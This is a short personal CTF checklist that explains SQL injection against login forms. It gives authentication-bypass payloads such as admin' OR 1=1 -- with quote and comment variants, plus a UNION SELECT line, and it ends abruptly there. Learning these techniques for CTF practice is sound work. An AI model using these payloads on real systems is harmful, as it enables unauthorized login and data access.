This file containes a checklist for myself to use in CTF challenge.

# Table of Content
1. [Web-app Testing](#webapp)
- [SQL Injection](#sqlinj)
- [XSS](#xss)
















<a name="webapp"></a>
# Web-app testing

<a name="sqlinj"></a>
## SQL Injection

### Login Form 
Normally, a POST request would takes two parameters (i.e. username and password) from the login form. Thus, the SQL command at the backend is look something like this:

```
SELECT * from TABLE where USERNAME='USERNAME' AND PASSWORD = 'PASSWORD';
```
Thus, if we type payload below into the username field, 

```
admin' OR 1=1 --
```
the whole SQL would becomes:

```
SELECT * from TABLE where USERNAME='admin' OR 1=1 --AND PASSWORD='PASSWORD';
```
Thus, as 1=1 is true and OR is used in the condition, also ```--``` has commented out the rest of the statement, the system would log us in as the first user from the Database. Also, as some SQL syntax varies in different system. Thus, you may also try something like below: 

```
admin' OR 1=1 #
admin" OR 1=1 #
admin" OR 1=1 --
```
Above two are basically doing the same thing. If success, it would log us in to the first user stored in its database.
```
 ' UNION SELECT 1 # 
```





